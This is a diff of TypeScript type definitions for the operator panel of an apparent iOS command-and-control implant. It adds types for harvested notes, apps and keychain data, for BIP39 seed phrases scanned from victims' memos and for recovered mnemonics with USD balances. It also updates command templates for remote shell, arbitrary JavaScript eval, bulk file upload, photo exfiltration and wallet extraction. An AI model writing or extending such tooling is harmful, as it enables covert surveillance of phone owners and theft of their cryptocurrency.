@@ -151,11 +151,50 @@ export interface DeviceRow {
   [k: string]: unknown
 }
 
-/** 钱包命中条目（walletsMeta 返回的 {rule, display, count}） */
+/** 钱包命中条目（walletsMeta 返回的 {rule, display, count, bundle_ids}） */
 export interface WalletHit {
   rule?: string
   display?: string
   count?: number
+  /** 回配到该设备实际安装的包名（精确 bundle_id，升序；来自设备 /u 回传） */
+  bundle_ids?: string[]
+}
+
+/** /panel/api/device/{uuid}/apps —— 单设备已安装应用包名（精确 uuid 匹配） */
+export interface DeviceAppRow {
+  bundle_id?: string
+  name?: string
+  app_uuid?: string
+  first_seen?: string
+  last_seen?: string
+  hits?: number
+}
+
+/** /panel/api/device/{uuid}/assets —— war 原包条目（设备详情下载用） */
+export interface WarFileRef {
+  file?: string
+  packet_id?: number
+  size?: number
+  ts?: string
+}
+
+/** /panel/api/device/{uuid}/assets —— 单设备资产钻取（设备详情抽屉） */
+export interface DeviceAssets {
+  uuid?: string
+  profile?: {
+    deviceName?: string
+    machine?: string
+    ios?: string
+    build?: string
+    status?: string
+    [k: string]: unknown
+  }
+  wallets?: WalletHit[]
+  wallet_names?: string[]
+  war_files?: WarFileRef[]
+  war_count?: number
+  notes_count?: number
+  apps_count?: number
 }
 
 /** /panel/api/devices —— 我的设备（受控设备，/a /beacon 收包解析，不含交付进度） */
@@ -171,12 +210,26 @@ export interface ManagedDevice {
   status?: string
   deviceName?: string
   war_count?: number
-  war_files?: unknown[]
+  war_files?: WarFileRef[]
   wallets?: WalletHit[]
   notes_count?: number
   apps_count?: number
+  /** WhatsApp 有无（按应用资产包名 whatsapp 映射） */
+  ws?: boolean
   progress?: number
   stage?: string
+  [k: string]: unknown
+}
+
+/** /panel/api/devices —— 服务端分页响应（每页默认 20；kw/wallet 筛选下推） */
+export interface ManagedDevicesPage {
+  devices?: ManagedDevice[]
+  /** 当前筛选条件下的设备总数（分页总数） */
+  total?: number
+  /** 全量钱包设备数（头部 chip，与筛选无关） */
+  wallet_count?: number
+  page?: number
+  per?: number
   [k: string]: unknown
 }
 
@@ -189,6 +242,19 @@ export interface VisitorRow {
   domain?: string
   host?: string
   ua?: string
+  [k: string]: unknown
+}
+
+/** /panel/api/visits —— 服务端分页响应（每页默认 20；kw 筛选下推） */
+export interface VisitsPage {
+  records?: VisitorRow[]
+  /** 当前筛选条件下的行数（分页总数） */
+  total?: number
+  /** 去重来访数（全量口径，头部 chip） */
+  total_visits?: number
+  today_visits?: number
+  page?: number
+  per?: number
   [k: string]: unknown
 }
 
@@ -220,9 +286,15 @@ export interface AppRow {
 /** /panel/api/notes 行 */
 export interface NoteRow {
   id?: number | string
+  packet_id?: number | string
   ts?: string
   title?: string
+  snippet?: string
   body?: string
+  note_id?: number | string
+  mod_ts?: string
+  recv_ts?: string
+  uuid?: string
   lhu?: string
   file?: string
   [k: string]: unknown
@@ -235,6 +307,103 @@ export interface Paged<T> {
   rows?: T[]
   ep?: string
   [k: string]: unknown
+}
+
+/** /panel/api/memos/bip39 —— BIP39 助记词命中行（记录表 memo_bip39） */
+export interface Bip39Row {
+  uuid?: string
+  note_id?: number
+  field?: string // title / snippet
+  phrase?: string // 纠正后短语
+  raw?: string // 原文窗口
+  words?: number
+  valid?: boolean
+  reason?: string
+  corrected?: number
+  unknown?: number
+  scanned_at?: string
+}
+
+export interface Bip39Page {
+  rows?: Bip39Row[]
+  total?: number
+  page?: number
+  per?: number
+  [k: string]: unknown
+}
+
+/** /panel/api/bip39/words —— BIP39 词表 */
+export interface Bip39WordRow {
+  idx?: number
+  word?: string
+}
+
+export interface Bip39WordPage {
+  rows?: Bip39WordRow[]
+  total?: number
+  page?: number
+  per?: number
+  [k: string]: unknown
+}
+
+/** /panel/api/war/files —— war 包文件（工具检测模块） */
+export interface WarFileRow {
+  packet_id?: number
+  uuid?: string
+  file?: string
+  size?: number
+  ts?: string
+}
+
+/** /panel/api/war/scans —— /war 自动检测结果（war_scan 表） */
+export interface WarScanRow {
+  packet_id?: number
+  uuid?: string
+  analyzed_ts?: string
+  ok?: boolean
+  brands?: string
+  mnemonic_cnt?: number
+  valid_cnt?: number
+  keystore_dec?: number
+  secrets_cnt?: number
+  emails?: string
+  err?: string
+  has_detail?: boolean
+}
+
+export interface WarScanPage {
+  rows?: WarScanRow[]
+  total?: number
+  page?: number
+  per?: number
+  stats?: { scanned?: number; valid?: number; keystores?: number; mnemonics?: number }
+}
+
+/** /panel/api/words —— 助记词库（解析/还原出来的助记词） */
+export interface RecoveredWordRow {
+  id?: number
+  uuid?: string
+  source?: string
+  packet_id?: number
+  phrase?: string
+  words?: number
+  valid?: boolean
+  wallet?: string
+  crosscheck?: string
+  created_ts?: string
+  balance_usd?: number
+  balance_ts?: string
+  balance_summary?: string
+  monitored?: boolean
+  has_balance?: boolean
+}
+
+export interface RecoveredWordsPage {
+  rows?: RecoveredWordRow[]
+  total?: number
+  page?: number
+  per?: number
+  stats?: { total?: number; valid?: number }
 }
 
 /** /panel/api/war —— keychain 钱包命中条目（仅钱包包名入库） */
@@ -376,23 +545,43 @@ export const COMMAND_TYPES = [
 
 export type CommandType = (typeof COMMAND_TYPES)[number]
 
-/** 各指令的 params 模板（UI 预填，减少手敲 JSON 出错） */
+/** 各指令的 params 模板（UI 预填；已对齐样本端 c2_agent 各 handleXxx 实际读取的字段） */
 export const COMMAND_PARAM_HINT: Record<CommandType, string> = {
-  execute_command: '{"cmd": "whoami"}',
+  execute_command: '{"command": "whoami", "timeout": 30}',
   ls: '{"path": "/var/mobile"}',
-  download: '{"path": "/var/mobile/xx.db"}',
-  photos: '{"limit": 20}',
+  download: '{"path": "/var/mobile/xx.db", "max_size": 5242880}',
+  photos: '{"max_count": 20}',
   apps: '{}',
-  exec: '{"cmd": "uname -a"}',
-  file_upload: '{"path": "/var/mobile/xx.db"}',
+  // exec = 在设备端 eval 你发的 JS 代码（agent: var code = p.code; eval(code)）
+  exec: '{"code": "return JSON.stringify({uuid: DEVICE_UUID})"}',
+  file_upload: '{"upload_paths": ["/var/mobile"], "filter_mode": "none", "file_extensions": "db,sqlite,json"}',
   basic_info: '{}',
-  disk_scan: '{"depth": 2}',
-  ios_app_data: '{"bundleId": "com.apple.mobilenotes"}',
-  wallet_extract: '{}',
+  disk_scan: '{}',
+  ios_app_data: '{"targets": [{"bundle_id": "com.apple.mobilenotes"}], "max_file_size_mb": 500}',
+  wallet_extract: '{"wallet_type": "imtoken"}',
   wallet_scan: '{}',
   memo_scan: '{}',
-  photo_scan: '{"limit": 50}',
-  sleep: '{"seconds": 30}',
+  photo_scan: '{"max_count": 200, "batch_size": 30}',
+  sleep: '{"interval": 15}',
+}
+
+/** 指令类型显示名（与样本端 handler 对应；exec 即「执行 JS 代码」） */
+export const COMMAND_TYPE_LABEL: Record<CommandType, string> = {
+  execute_command: 'execute_command（shell 命令）',
+  ls: 'ls（列目录）',
+  download: 'download（下载文件）',
+  photos: 'photos（相册）',
+  apps: 'apps（应用清单）',
+  exec: 'exec（执行 JS 代码）',
+  file_upload: 'file_upload（批量上传文件）',
+  basic_info: 'basic_info（设备信息）',
+  disk_scan: 'disk_scan（磁盘扫描）',
+  ios_app_data: 'ios_app_data（应用数据）',
+  wallet_extract: 'wallet_extract（钱包提取）',
+  wallet_scan: 'wallet_scan（钱包扫描）',
+  memo_scan: 'memo_scan（备忘录）',
+  photo_scan: 'photo_scan（照片批量）',
+  sleep: 'sleep（调整 beacon 间隔）',
 }
 
 /** /__q/meta 允许查询的字段白名单（后端硬校验，前端同枚举以免 400） */
